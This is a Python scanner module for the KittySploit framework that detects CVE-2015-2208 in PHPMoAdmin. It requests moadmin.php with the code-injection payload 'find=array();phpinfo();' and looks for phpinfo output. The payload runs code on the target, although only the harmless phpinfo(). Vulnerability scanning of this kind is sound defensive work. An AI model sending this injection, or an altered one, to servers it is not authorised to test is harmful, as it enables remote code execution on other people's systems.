#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHPMoAdmin find=array();phpinfo(); RCE (CVE-2015-2208)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPMoAdmin - find Parameter RCE Detection (CVE-2015-2208)',
        'description': (
            'Detects CVE-2015-2208 by requesting moadmin.php with '
            'find=array();phpinfo(); and matching phpinfo markers.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'phpmoadmin', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-2208',
        ],
        'cve': 'CVE-2015-2208',
    }

    def run(self):
        for base in ('/phpmoadmin', '/moadmin', '/wu-moadmin', ''):
            for file in ('/moadmin.php', '/wu-moadmin.php'):
                probe = self.http_request(method='GET', path=base + file, allow_redirects=False)
                if not probe or probe.status_code != 200:
                    continue
                path = (
                    f'{base}{file}?db=admin&action=listRows&collection=fdsa'
                    '&find=array();phpinfo();'
                )
                r = self.http_request(method='GET', path=path, allow_redirects=False)
                if not r:
                    continue
                body = r.text or ''
                if '>phpinfo()<' in body or ('PHP Version' in body and 'Configuration File' in body):
                    self.set_info(
                        severity='critical',
                        reason='PHPMoAdmin find RCE (CVE-2015-2208)',
                        path=base + file,
                    )
                    return True
        return False
